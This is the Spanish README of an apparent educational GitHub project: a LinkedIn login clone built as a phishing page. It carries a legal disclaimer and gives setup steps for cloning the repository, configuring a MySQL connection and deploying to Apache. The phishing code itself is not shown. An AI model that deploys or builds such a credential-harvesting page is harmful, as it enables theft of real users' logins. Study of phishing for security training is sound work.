# LinkedIn Phishing

LinkedIn Clone para un supuetso Phishing de la página.

# ⚠️ ADVERTENCIA

Este proyecto fue desarrollado **exclusivamente con fines educacionales** como parte de un curso de seguridad informática. **No debe ser utilizado en ningún otro contexto ni con intenciones maliciosas.**

**Aviso Legal:**

El uso de clone esta estrictamente prohibido en diversos países si no se cuenta con el consentimiento explícito del usuario final. El monitoreo o captura de las actividades de un usuario sin su autorización es una violación grave de la privacidad y puede conllevar sanciones legales.

Este código **no debe ser utilizado fuera del entorno educacional ni aplicado a sistemas en producción o dispositivos ajenos sin autorización y consentimiento explicito.**
**El autor no se hace responsable por el uso indebido de este código.** Cualquier intento de utilizar este proyecto para propósitos distintos a los estipulados en este repositorio es **bajo responsabilidad del usuario.**

# Requisitos:

Es necesario contar con lo siguiente para poder ejecutar y/o compilar la página correctamente:

- **MySQL o similar**
- **Servidor Apache o similar**
- **PHP o similar**

# Instrucciones de uso:

Clonar este repositorio con ayuda del comando:

```c
  git clone https://github.com/NightMare070/LinkedIn_Phishing.git
```
Una vez clonado en el archivo **con_db.php** configurar el archivo con los datos de tu BD

```c
  $conex = mysqli_connect("localhost", "root", "BD_password", "phishing");
```

Ya configurado mover la carpeta del proyecto a la carpeta **htdocs** de **Apache** para lanzar el sitio web. 